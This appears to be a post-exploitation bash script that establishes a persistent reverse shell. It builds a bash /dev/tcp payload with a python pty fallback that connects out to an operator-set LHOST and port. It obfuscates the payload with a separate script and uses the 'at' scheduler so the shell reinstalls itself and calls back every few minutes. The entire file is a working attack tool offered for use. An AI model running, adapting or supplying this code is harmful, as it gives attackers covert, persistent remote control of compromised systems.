#!/usr/bin/env bash

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/obfuscate.sh"

LHOST="${LHOST:-}"
LPORT="${LPORT:-4444}"
INTERVAL="${INTERVAL:-3}"   # minutes between callbacks

info()  { echo "[*] $*"; }
success() { echo "[+] $*"; }
error()   { echo "[-] $*" >&2; }
warn() { echo "[!] $*"; }

# -- Preflight checks --

if [[ -z "$LHOST" ]]; then
    error "LHOST is not set. Export it before running:"
    error " Export LHOST=<ip address>"
    exit 1
fi

if ! command -v at &>/dev/null; then
    error "'at' is not installed - cannot use this callback method"
    exit 1
fi

# -- Build Payload --
RAW_PAYLOAD="bash -c 'exec bash -i &>/dev/tcp/${LHOST}/${LPORT} <&1' 2>/dev/null || python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${LHOST}\",${LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")' 2>/dev/null"

DECODER=$(ob_decoder "$RAW_PAYLOAD")

# -- Build at Job --
AT_JOB="echo '${DECODER}' | at now + ${INTERVAL} minutes 2>/dev/null; ( ${DECODER} ) &>/dev/null &"

# -- Install --
info "Scheduling at job (callback every ${INTERVAL} minutes -> ${LHOST}:${LPORT})"

echo "$AT_JOB" | at now + 1 minute 2>/dev/null

success "at job scheduled with first callback in 1 minute"
info "Check pending with: atq"
info "Remove pending with: atq | awk '{print \$1}' | xargs atrm"

